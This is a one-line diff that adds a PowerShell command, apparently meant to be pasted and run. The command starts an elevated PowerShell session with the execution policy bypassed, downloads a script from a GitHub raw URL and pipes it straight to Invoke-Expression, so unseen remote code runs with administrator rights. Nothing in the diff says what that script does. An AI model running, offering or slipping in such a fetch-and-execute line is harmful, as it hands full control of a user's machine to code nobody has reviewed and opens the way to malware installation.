@@ -1,0 +1,1 @@
+Start-Process powershell.exe -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/Raad2002/clone/main/Run.ps1 | iex`""
